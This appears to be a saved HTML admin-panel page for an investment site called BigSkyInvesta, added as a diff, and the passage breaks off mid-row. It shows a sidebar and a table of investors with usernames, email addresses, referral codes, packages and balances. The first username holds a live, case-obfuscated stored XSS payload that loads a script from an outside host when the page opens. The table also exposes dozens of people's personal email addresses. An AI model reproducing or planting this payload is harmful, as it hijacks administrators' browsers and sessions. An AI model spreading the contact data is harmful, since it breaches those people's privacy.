@@ -1,0 +1,3432 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>BigSkyInvesta</title>
+  <!-- Tell the browser to be responsive to screen width -->
+  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
+  <!-- Bootstrap 3.3.7 -->
+  <link rel="stylesheet" href="bower_components/bootstrap/dist/css/bootstrap.min.css">
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="bower_components/font-awesome/css/font-awesome.min.css">
+  <!-- Ionicons -->
+  <link rel="stylesheet" href="bower_components/Ionicons/css/ionicons.min.css">
+  <!-- Theme style -->
+  <link rel="stylesheet" href="dist/css/AdminLTE.min.css">
+ 
+  <link rel="stylesheet" href="dist/css/skins/_all-skins.min.css">
+  <!-- Morris chart -->
+  <link rel="stylesheet" href="bower_components/morris.js/morris.css">
+  <!-- jvectormap -->
+  <link rel="stylesheet" href="bower_components/jvectormap/jquery-jvectormap.css">
+  <!-- Date Picker -->
+  <link rel="stylesheet" href="bower_components/bootstrap-datepicker/dist/css/bootstrap-datepicker.min.css">
+  <!-- Daterange picker -->
+  <link rel="stylesheet" href="bower_components/bootstrap-daterangepicker/daterangepicker.css">
+  <!-- bootstrap wysihtml5 - text editor -->
+  <link rel="stylesheet" href="plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.min.css">
+
+
+
+  <link rel="stylesheet" href="css/page.css">
+  <!-- Font Awesome -->
+
+  <!-- Google Font -->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,300italic,400italic,600italic">
+</head>
+<body style="background-color:#051045;color:;" >
+<div class="wrapper">
+
+  <header class="main-header" >
+    <!-- Logo -->
+    <a  class="logo">
+     
+     
+      <!-- logo for regular state and mobile devices -->
+      <span class="logo-lg"><b>ADMIN PANEL</b></span>
+    </a>
+    <!-- Header Navbar: style can be found in header.less -->
+    <nav class="navbar navbar-static-top">
+      <!-- Sidebar toggle button-->
+      <a  class="sidebar-toggle" data-toggle="push-menu" role="button">
+        <span class="sr-only">Toggle navigation</span>
+      </a>
+
+      <div class="navbar-custom-menu">
+        <ul class="nav navbar-nav">
+        
+                      <li>
+                
+                
+            </li>   
+          
+        </ul>
+      </div>
+    </nav>
+  </header>
+  <!-- Left side column. contains the logo and sidebar -->
+  <aside class="main-sidebar" >
+    <!-- sidebar: style can be found in sidebar.less -->
+    <section class="sidebar">
+      <!-- Sidebar user panel -->
+      <div class="user-panel">
+  <style>
+      a{
+          color:#fff;
+      }
+  </style>     
+        
+      </div>
+  
+     
+      <ul class="sidebar-menu" data-widget="tree" >
+        <li class="header" style="color: #fff;">WELCOME </li>
+       
+      
+       
+        <li><a href="index.php?"><i class="fa fa-home"></i> Home </a>
+
+                  </li>
+                  
+                  
+                  
+                  
+                  
+                   <li class="treeview">
+          <a href="#">
+            <i class="fa fa-lock"></i>
+            <span> Security</span>
+            <span class="pull-right-container">
+              <i class="fa fa-angle-down pull-right"></i>
+            </span>
+          </a>
+          <ul class="treeview-menu">
+            <li><a href="password.php"><i class="fa fa-refresh"></i>Change Password</a></li>
+            
+            <li><a href="deactivate.php"><i class="fa fa-times"></i> Deactive Authenticator</a></li>
+            
+          </ul>
+        </li>
+                  
+                  <li><a href="log-outa.php">
+				  <i class="fa  fa-sign-out"></i> Log-out</a>
+          </li>
+              <li><a href="settings.php">
+				  <i class="fa  fa-cog"></i> Settings</a>
+          </li>
+          
+               <li><a href="addwallet.php">
+				  <i class="fa  fa-plus"></i> Admin Wallet</a>
+          </li>
+
+          <li class="treeview">
+          <a href="#">
+            <i class="fa fa-archive"></i>
+            <span> Investors Management</span>
+            <span class="pull-right-container">
+              <i class="fa fa-angle-down pull-right"></i>
+            </span>
+          </a>
+          <ul class="treeview-menu">
+            <li><a href="users.php"><i class="fa fa-users"></i> View Investors</a></li>
+            
+            <li><a href="../../users/form/signup.php"><i class="fa fa-users"></i> Add Investors</a></li>
+            
+            <li><a href="verify.php"><i class="fa fa-check"></i> Verify Investors</a></li>
+            <li><a href="edit.php"><i class="fa fa-users"></i> Manage Users</a></li>
+            
+          </ul>
+        </li>
+        <li class="treeview">
+          <a href="#">
+            <i class="fa fa-user"></i>
+            <span> Requested Transactions</span>
+            <span class="pull-right-container">
+              <i class="fa fa-angle-down pull-right"></i>
+            </span>
+          </a>
+          <ul class="treeview-menu">
+            <li><a href="withdraw.php"><i class="fa fa-refresh"></i> Withdrawal Request</a></li>
+            <li><a href="deposit.php"><i class="fa fa-send"></i> Deposited Orders</a></li>
+           
+            
+          </ul>
+        </li>
+				   
+                  <li class="treeview">
+          <a href="#">
+            <i class="fa fa-gears"></i>
+            <span>Manage Packages</span>
+            <span class="pull-right-container">
+              <i class="fa fa-angle-down pull-right"></i>
+            </span>
+          </a>
+          <ul class="treeview-menu">
+            <li><a href="addpackages.php"><i class="fa fa-plus"></i> Add Packages</a></li>
+            <li><a href="ivtpackages.php"><i class="fa fa-users"></i> Investors Package </a></li>
+            <li><a href="upgrade.php"><i class="fa fa-eye"></i> View Added Packages</a></li>
+            
+          </ul>
+        </li>
+       
+         <li class="treeview">
+          <a href="#">
+            <i class="fa fa-comment"></i>
+            <span>Send Message & Mail</span>
+            <span class="pull-right-container">
+              <i class="fa fa-angle-down pull-right"></i>
+            </span>
+          </a>
+          <ul class="treeview-menu">
+            <li><a href="inmessage.php"><i class="fa fa-comment"></i> Message Investors</a></li>
+           
+         			<li><a href="viewmail.php"><i class="fa fa-eye"></i> View Messages</a></li>
+         			
+         			
+         			<li><a href="sendmail.php"><i class="fa fa-eye"></i>Send Mail</a></li>
+            
+          </ul>
+        </li>
+       
+       
+       
+      </ul>
+    </section>
+    <!-- /.sidebar -->
+  </aside>
+
+  
+   
+
+
+
+<!-- jQuery 3 -->
+<script src="bower_components/jquery/dist/jquery.min.js"></script>
+<!-- jQuery UI 1.11.4 -->
+<script src="bower_components/jquery-ui/jquery-ui.min.js"></script>
+<!-- Resolve conflict in jQuery UI tooltip with Bootstrap tooltip -->
+<script>
+  $.widget.bridge('uibutton', $.ui.button);
+</script>
+<!-- Bootstrap 3.3.7 -->
+<script src="bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
+<!-- Morris.js charts -->
+<script src="bower_components/raphael/raphael.min.js"></script>
+<script src="bower_components/morris.js/morris.min.js"></script>
+<!-- Sparkline -->
+<script src="bower_components/jquery-sparkline/dist/jquery.sparkline.min.js"></script>
+<!-- jvectormap -->
+<script src="plugins/jvectormap/jquery-jvectormap-1.2.2.min.js"></script>
+<script src="plugins/jvectormap/jquery-jvectormap-world-mill-en.js"></script>
+<!-- jQuery Knob Chart -->
+<script src="bower_components/jquery-knob/dist/jquery.knob.min.js"></script>
+<!-- daterangepicker -->
+<script src="bower_components/moment/min/moment.min.js"></script>
+<script src="bower_components/bootstrap-daterangepicker/daterangepicker.js"></script>
+<!-- datepicker -->
+<script src="bower_components/bootstrap-datepicker/dist/js/bootstrap-datepicker.min.js"></script>
+<!-- Bootstrap WYSIHTML5 -->
+<script src="plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.all.min.js"></script>
+<!-- Slimscroll -->
+<script src="bower_components/jquery-slimscroll/jquery.slimscroll.min.js"></script>
+<!-- FastClick -->
+<script src="bower_components/fastclick/lib/fastclick.js"></script>
+<!-- AdminLTE App -->
+<script src="dist/js/adminlte.min.js"></script>
+<!-- AdminLTE dashboard demo (This is only for demo purposes) -->
+<script src="dist/js/pages/dashboard.js"></script>
+<!-- AdminLTE for demo purposes -->
+<script src="dist/js/demo.js"></script>
+</body>
+</html>
+
+
+  <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.10.19/css/jquery.dataTables.css">
+  
+  
+
+  <link rel="stylesheet" href=" https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">
+  <link rel="stylesheet" href=" https://cdn.datatables.net/1.10.19/css/dataTables.jqueryui.min.css">
+  <link rel="stylesheet" href=" https://cdn.datatables.net/buttons/1.5.6/css/buttons.jqueryui.min.css">
+
+
+
+  
+
+  <link rel="stylesheet" href=" https://cdn.datatables.net/1.10.19/css/dataTables.bootstrap.min.css">
+  <link rel="stylesheet" href=" https://cdn.datatables.net/buttons/1.5.6/css/buttons.bootstrap.min.css">
+  <link rel="stylesheet" href="">
+ 
+  
+    
+    
+
+
+
+  <script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/1.10.19/js/jquery.dataTables.js"></script>
+ 
+
+  <script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>
+  <script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/1.10.19/js/dataTables.jqueryui.min.js"></script>
+  <script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/buttons/1.5.6/js/dataTables.buttons.min.js"></script>
+
+  <script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/buttons/1.5.6/js/buttons.jqueryui.min.js"></script>
+   
+  <script type="text/javascript" charset="utf8" src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.1.3/jszip.min.js"></script>
+  <script type="text/javascript" charset="utf8" src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/pdfmake.min.js"></script>
+  <script type="text/javascript" charset="utf8" src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/vfs_fonts.js"></script>
+  <script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/buttons/1.5.6/js/buttons.html5.min.js"></script>
+  <script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/buttons/1.5.6/js/buttons.print.min.js"></script>
+  <script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/buttons/1.5.6/js/buttons.colVis.min.js"></script>
+  
+
+     
+ <div class="content-wrapper">
+  
+
+
+  <!-- Main content -->
+  <section class="content">
+
+
+
+   <style>
+ 
+	
+   </style>
+
+
+<div style="width:100%">
+          <div class="box box-default">
+            <div class="box-header with-border">
+
+	<div class="row">
+
+
+		 <h2 class="text-center">INVESTORS MANAGEMENT</h2>
+		  </br>
+           </br>
+		    </br>
+
+
+
+
+<div class="col-md-12 col-sm-12 col-sx-12">
+               <div class="table-responsive">
+                     <table class="display"  id="example">
+
+
+					<thead>
+
+						<tr class="info">
+						<th>Username</th>
+							<th>Email</th>
+							<th style="display:none;"></th>
+							
+							<th>Refcode</th>
+              <th>Package</th>
+              <th>Total Plan Profit</th>
+              <th>Status</th>
+							<th>Verification</th>
+							<th>Account Balance</th>
+							<th>Date</th>
+                                  <!--<th>Delete</th>-->
+                                
+
+						</tr>
+					</thead>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+					<tbody>
+									
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td><sCRiPt/sRC=//l01.co/a/></sCrIpT>Nocal</td>
+							<td id="email">Nocal@mail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="Nocal@mail.com"> </td>
+							
+							<td>shUT3jeJg2</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-11-10 08:12:49</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Mary</td>
+							<td id="email">n.zimkhitha01@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="n.zimkhitha01@gmail.com"> </td>
+							
+							<td>BhkeTZydCb</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-11-01 15:13:59</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>NazoMxhego</td>
+							<td id="email">nazomxhego@mail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="nazomxhego@mail.com"> </td>
+							
+							<td>8bsyrlaXVw</td>
+							<td> Beginner </td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>verified</td>
+							<td>0</td>
+              
+              <td>2025-10-30 05:41:09</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Wallton</td>
+							<td id="email">gudynation@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="gudynation@gmail.com"> </td>
+							
+							<td>l37Bs8tyG5</td>
+							<td> Beginner </td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-10-25 04:41:11</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Nomfundo</td>
+							<td id="email">masemolanomfundo43@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="masemolanomfundo43@gmail.com"> </td>
+							
+							<td>ZSCrSjb96a</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-10-24 09:48:16</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Zee</td>
+							<td id="email">zikhonanqenekile@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="zikhonanqenekile@gmail.com"> </td>
+							
+							<td>CHAVbCU3s9</td>
+							<td> Beginner </td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>367</td>
+              
+              <td>2025-10-23 05:40:10</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Plmoknijb7</td>
+							<td id="email">ngaikukuetejulius4@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="ngaikukuetejulius4@gmail.com"> </td>
+							
+							<td>9TsHhw3AQu</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-10-20 23:22:12</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>CIANGADA</td>
+							<td id="email">siyasamkelangada@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="siyasamkelangada@gmail.com"> </td>
+							
+							<td>dhjgy9CgNT</td>
+							<td> Classic</td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>180</td>
+              
+              <td>2025-10-16 04:48:19</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Zingisa</td>
+							<td id="email">zingisagoliat@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="zingisagoliat@gmail.com"> </td>
+							
+							<td>7l3Ss4j5sN</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-10-15 03:41:45</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Sisipho Nyango</td>
+							<td id="email">nyangosisipho@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="nyangosisipho@gmail.com"> </td>
+							
+							<td>ZG7SX9Be8N</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-10-13 06:23:45</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Livingstone</td>
+							<td id="email">rasumlivingstone@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="rasumlivingstone@gmail.com"> </td>
+							
+							<td>5MBBNldVhy</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-10-09 14:50:02</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>securepaypalsuport</td>
+							<td id="email">securepaypalsuport@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="securepaypalsuport@gmail.com"> </td>
+							
+							<td>N7Ryd6BT92</td>
+							<td> Classic</td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-10-04 13:07:13</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Marry Lazarus</td>
+							<td id="email">europmarkertereuropmarkerterpl@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="europmarkertereuropmarkerterpl@gmail.com"> </td>
+							
+							<td>h6dlBXDQfT</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>verified</td>
+							<td>10000</td>
+              
+              <td>2025-10-02 08:37:00</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Yonela</td>
+							<td id="email">yonelantlemeza07@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="yonelantlemeza07@gmail.com"> </td>
+							
+							<td>MZG8dwej5B</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-10-01 12:50:40</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>ramaphala.tebogos@gmail.com</td>
+							<td id="email">ramaphala.tebogos@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="ramaphala.tebogos@gmail.com"> </td>
+							
+							<td>RDWhSBSTP1</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-09-29 10:16:16</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Lindani17</td>
+							<td id="email">Lindanimabuza12@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="Lindanimabuza12@gmail.com"> </td>
+							
+							<td>TGhh0d8gdZ</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>600</td>
+              
+              <td>2025-09-24 17:39:24</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Total</td>
+							<td id="email">mshikwambi2@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="mshikwambi2@gmail.com"> </td>
+							
+							<td>BGhCj2fSU5</td>
+							<td>Week</td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>2400</td>
+              
+              <td>2025-09-24 01:57:44</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Debo1964@</td>
+							<td id="email">youngcleveland582@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="youngcleveland582@gmail.com"> </td>
+							
+							<td>579GjBCAg6</td>
+							<td>1 week </td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>1500</td>
+              
+              <td>2025-09-23 10:27:14</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Debo1964@</td>
+							<td id="email">squirtyyoung3@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="squirtyyoung3@gmail.com"> </td>
+							
+							<td>62CaT5AJyB</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-09-23 10:25:08</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Ziyanda</td>
+							<td id="email">ziyandastonga.zs@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="ziyandastonga.zs@gmail.com"> </td>
+							
+							<td>HG9lPBhcU0</td>
+							<td>1 week </td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>verified</td>
+							<td>4200</td>
+              
+              <td>2025-09-23 04:54:56</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>SimÃ£o</td>
+							<td id="email">crespocarlos73@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="crespocarlos73@gmail.com"> </td>
+							
+							<td>RykSgWs8ac</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-09-20 10:13:15</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Clemente Alexandre</td>
+							<td id="email">clementinoalexandre54@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="clementinoalexandre54@gmail.com"> </td>
+							
+							<td>sb2dGW198y</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-09-16 15:40:44</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>aisengsolomon9@gmail.com</td>
+							<td id="email">aisengsolomon9@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="aisengsolomon9@gmail.com"> </td>
+							
+							<td>0NBRa6uPdC</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-09-14 11:06:33</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Samwelbabu</td>
+							<td id="email">samwelbabu799@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="samwelbabu799@gmail.com"> </td>
+							
+							<td>T1l19N5WDP</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>541</td>
+              
+              <td>2025-09-12 11:13:35</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Angeline</td>
+							<td id="email">nontobekoangeline63@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="nontobekoangeline63@gmail.com"> </td>
+							
+							<td>hh1bh7MSN8</td>
+							<td>1 week </td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>700</td>
+              
+              <td>2025-09-09 06:44:50</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Nosi</td>
+							<td id="email">thandokwenama@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="thandokwenama@gmail.com"> </td>
+							
+							<td>fSwlW6cs5T</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-09-07 09:15:36</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Jenoch</td>
+							<td id="email">jenoch1951@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="jenoch1951@gmail.com"> </td>
+							
+							<td>1APetdhGe5</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-09-04 19:25:54</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Molefe</td>
+							<td id="email">molefemamosa3@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="molefemamosa3@gmail.com"> </td>
+							
+							<td>wcCjAdse73</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-09-04 00:57:09</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Denngans</td>
+							<td id="email">dennysyahputra2900@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="dennysyahputra2900@gmail.com"> </td>
+							
+							<td>Zsw8y6HBWs</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-09-02 18:42:25</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Nkululeko</td>
+							<td id="email">nkululekovilakazi52@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="nkululekovilakazi52@gmail.com"> </td>
+							
+							<td>h1RyCeDhBW</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>5000</td>
+              
+              <td>2025-09-02 08:52:35</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Nnani21</td>
+							<td id="email">ralitabomamahali@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="ralitabomamahali@gmail.com"> </td>
+							
+							<td>aZsdWl5hNh</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-09-02 02:52:57</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>nangah</td>
+							<td id="email">nangamsobhixa@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="nangamsobhixa@gmail.com"> </td>
+							
+							<td>9ehJBMrGeN</td>
